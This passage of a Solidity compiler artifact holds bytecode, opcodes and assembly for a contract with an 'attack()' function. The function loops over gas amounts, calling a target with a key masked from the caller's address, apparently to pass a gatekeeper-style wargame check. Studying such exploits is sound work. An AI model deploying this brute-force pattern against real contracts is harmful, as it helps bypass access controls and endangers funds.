0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x5FFD DUP4 ADD DUP5 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3370204E00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x16A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x147 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1CD JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 ISZERO PUSH2 0x1E2 JUMPI POP PUSH2 0x1F0 JUMP JUMPDEST POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x45 JUMP JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC7 0xC7 0xBD PUSH30 0xAA99E8436F9E8D72B4EF9C95C8AB6528ECBE48567BBEE2635F0FAB3A6473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "1281:490:1:-:0;;;1328:73;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1387:7;1379:6;;:15;;;;;;;;;;;;;;;;;;1328:73;1281:490;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061001e5760003560e01c80639e5faafc14610023575b600080fd5b61002b61002d565b005b600067ffffffff0000ffff60c01b3360c01b16905060005b61012c8110156101f05760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16615ffd830184604051602401808277ffffffffffffffffffffffffffffffffffffffffffffffff191681526020019150506040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016a5780518252602082019150602081019050602083039250610147565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146101cd576040519150601f19603f3d011682016040523d82523d6000602084013e6101d2565b606091505b5050905080156101e257506101f0565b508080600101915050610045565b505056fea2646970667358221220c7c7bd7daa99e8436f9e8d72b4ef9c95c8ab6528ecbe48567bbee2635f0fab3a64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x23 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2B PUSH2 0x2D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFF0000FFFF PUSH1 0xC0 SHL CALLER PUSH1 0xC0 SHL AND SWAP1 POP PUSH1 0x0 JUMPDEST PUSH2 0x12C DUP2 LT ISZERO PUSH2 0x1F0 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x5FFD DUP4 ADD DUP5 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3370204E00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x16A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x147 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1CD JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 ISZERO PUSH2 0x1E2 JUMPI POP PUSH2 0x1F0 JUMP JUMPDEST POP DUP1 DUP1 PUSH1 0x1 ADD SWAP2 POP POP PUSH2 0x45 JUMP JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC7 0xC7 0xBD PUSH30 0xAA99E8436F9E8D72B4EF9C95C8AB6528ECBE48567BBEE2635F0FAB3A6473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "1281:490:1:-:0;;;;;;;;;;;;;;;;;;;;;1407:357;;;:::i;:::-;;;1450:10;1491:18;1463:46;;1477:10;1463:26;;:46;1450:59;;1524:9;1519:230;1543:3;1539:1;:7;1519:230;;;1568:12;1594:6;;;;;;;;;;;1586:20;;1617:8;1612:1;:14;1669:3;1628:45;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1586:88;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1567:107;;;1692:7;1688:51;;;1719:5;;;1688:51;1519:230;1548:3;;;;;;;1519:230;;;;1407:357;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "110800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "LT",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1387,
									"end": 1394,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1385,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1379,
									"end": 1385,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 1379,
									"end": 1394,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1328,
									"end": 1401,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1281,
									"end": 1771,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c7c7bd7daa99e8436f9e8d72b4ef9c95c8ab6528ecbe48567bbee2635f0fab3a64736f6c634300060c0033",
									".code": [
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "9E5FAAFC"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1281,
											"end": 1771,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1407,
											"end": 1764,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1460,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1491,
											"end": 1509,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF0000FFFF"
										},
										{
											"begin": 1463,
											"end": 1509,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 1463,
											"end": 1509,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1477,
											"end": 1487,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 1463,
											"end": 1489,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 1463,
											"end": 1489,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1463,
											"end": 1509,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1509,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1450,
											"end": 1509,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1524,
											"end": 1533,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1543,
											"end": 1546,
											"name": "PUSH",
											"source": 1,
											"value": "12C"
										},
										{
											"begin": 1539,
											"end": 1540,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1539,
											"end": 1546,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1519,
											"end": 1749,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1568,
											"end": 1580,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1594,
											"end": 1600,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1606,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1586,
											"end": 1606,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1617,
											"end": 1625,
											"name": "PUSH",
											"source": 1,
											"value": "5FFD"
										},
										{
											"begin": 1612,
											"end": 1613,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1612,
											"end": 1626,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1669,
											"end": 1672,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "3370204E00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "OR",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1628,
											"end": 1673,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1674,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1586,
											"end": 1674,
